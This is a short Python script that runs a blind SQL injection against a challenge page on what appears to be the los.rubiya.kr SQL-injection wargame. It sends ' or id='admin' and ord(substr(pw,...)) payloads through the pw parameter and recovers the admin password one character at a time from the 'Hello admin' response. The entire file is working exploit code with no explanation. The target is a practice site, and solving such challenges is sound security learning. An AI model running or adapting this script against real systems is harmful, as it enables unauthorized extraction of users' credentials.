import requests

cookie = {'PHPSESSID' : '~~~~'}

fin_flag = False
pw_value = ""
for i in range(20):
    for j in range(0x00, 0x10000, 0x100):
        url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?\
                pw=1234' or id='admin' and ord(substr(pw,%d,1))<%d %%23" % (i+1, j)
        res = requests.get(url, cookies=cookie)

        if "Hello admin" in res.text:
            range_st = j - 0x100
            range_fin = j
            print("pw(%d) in %s ~ %s" % (i+1, hex(range_st), hex(range_fin)))
            break
    
    for j in range(range_st, range_fin+1):
        url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?\
                pw=1234' or id='admin' and ord(substr(pw,%d,1))=%d %%23" % (i+1, j)
        res = requests.get(url, cookies=cookie)

        if "Hello admin" in res.text:
            if (j==0):
                print("done!")
                fin_flag = True
                break
                
            pw_value += chr(j)
            print("pw(%d) : %s" % (i+1, pw_value))
            break
    
    if(fin_flag):
        break
            
print("pw :", pw_value)